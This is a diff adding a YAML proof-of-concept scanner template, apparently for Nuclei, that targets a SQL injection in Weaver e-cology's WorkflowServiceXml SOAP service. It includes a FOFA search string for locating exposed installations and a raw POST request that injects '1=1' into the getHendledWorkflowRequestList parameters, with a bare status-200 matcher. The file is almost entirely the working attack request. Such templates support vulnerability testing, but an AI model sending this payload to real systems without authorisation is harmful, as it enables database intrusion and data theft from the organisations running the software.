@@ -1,0 +1,19 @@
+id: poc-ylkhyl4bg8bpv7s8
+info:
+  name: 泛微e-cology WorkflowServiceXml SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ylkhyl4bg8bpv7s8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ylkhyl4bg8bpv7s8
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - "POST /services/WorkflowServiceXml HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Go-http-client/1.1\nContent-Length: 475\nContent-Type: text/xml\nAccept-Encoding: gzip, deflate, br\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservices.workflow.weaver\"> <soapenv:Header/>\n  <soapenv:Body>\n      <web:getHendledWorkflowRequestList>\n        <web:in0>1</web:in0>\n        <web:in1>1</web:in1>\n        <web:in2>1</web:in2>\n        <web:in3>1</web:in3>\n        <web:in4>\n            <web:string>1=1</web:string>\n        </web:in4>\n      </web:getHendledWorkflowRequestList>\n  </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
